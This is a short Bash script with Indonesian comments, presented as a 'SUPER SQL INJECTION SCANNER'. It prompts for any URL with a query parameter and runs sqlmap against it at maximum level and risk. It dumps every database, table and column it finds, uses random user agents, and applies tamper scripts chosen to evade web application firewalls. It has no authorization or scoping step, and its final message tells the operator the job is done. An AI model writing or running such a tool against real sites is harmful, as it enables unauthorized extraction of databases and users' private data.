#!/bin/bash

# Warna
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
reset='\e[0m'

# Tampilan
clear
echo -e "${cyan}  >>> SUPER SQL INJECTION SCANNER <<<${reset}"
echo ""

# Loading
loading_bar() {
    bar=">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    for i in {1..35}; do
        echo -ne "\r${yellow}[*] Bentar Scan Dulu ${bar:0:$i}${reset}"
        sleep 0.05
    done
    echo -e "\n"
}

read -p "$(echo -e ${green}"-->> [ LINK WEB ] : "${reset})" target

# Validasi URL
if [[ "$target" != *"="* ]]; then
    echo -e "${red}[!] ERROR: PARAMETER TIDAK ADA (index.php?id=1)${reset}"
    exit 1
fi

# Scan
echo -e "${green}>> SCAN DI GASIN <<${reset}"
loading_bar

# Eksekusi SQLMAP
sqlmap -u "$target" --batch --dbs --tables --columns --dump \
--level=5 --risk=3 --threads=10 --random-agent \
--force-ssl --ignore-redirects \
--tamper=between,randomcase,space2comment \
--technique=BEUSTQ --batch

# Sukses
echo -e "${green}[✔] Sudah Bos${reset}"
